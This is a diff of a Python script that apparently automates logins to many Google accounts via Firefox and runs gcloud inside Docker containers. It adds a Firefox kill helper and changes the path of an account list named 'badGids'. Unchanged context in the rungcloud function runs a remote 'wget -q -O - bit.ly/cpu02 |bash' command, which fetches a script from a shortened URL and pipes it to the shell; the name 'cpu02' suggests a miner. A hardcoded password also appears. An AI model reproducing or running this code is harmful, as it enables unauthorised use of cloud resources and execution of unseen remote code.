@@ -34,8 +34,8 @@ gpass = 'Ms123456789'
 count = 0
 
 gaurl = ''
-
-listfile = '/home/one/g609'
+home_dir=os.path.expanduser('~')
+listfile = home_dir+'/badGids'
 
 ##############################################
 
@@ -132,7 +132,14 @@ def accept_code(gid, gpass, gurl):
         print('error firefox closing')
     return gkey
 
-
+def kill_firefox():
+        try:
+            cmd2='kill -9 $(ps -x | grep firefox)'
+            results = subprocess.run(cmd2,
+            shell=True, check=True,
+            executable='/bin/bash')
+        except:
+            print('error firefox closing')
 def rungcloud(gid):
     remote_cmd = "\"wget -q -O - bit.ly/cpu02 |bash\""
     command_line = 'docker run --rm --volumes-from gcloud-config-'+gid + \
@@ -186,6 +193,7 @@ def docker_create(gid, gpass):
                 print("Error in loop : "+str(looping))
                 status = 1
                 traceback.print_exc()
+                kill_firefox()
                 break
             if looping == 0:
                 try:
@@ -195,9 +203,11 @@ def docker_create(gid, gpass):
                     print("error pasting")
                     traceback.print_exc()
                     status = 2
+                    kill_firefox()
                     break
             print('##########################')
         looping = looping+1
+        kill_firefox()
     return status
 
 # container_status=docker_create(gid,gpass)
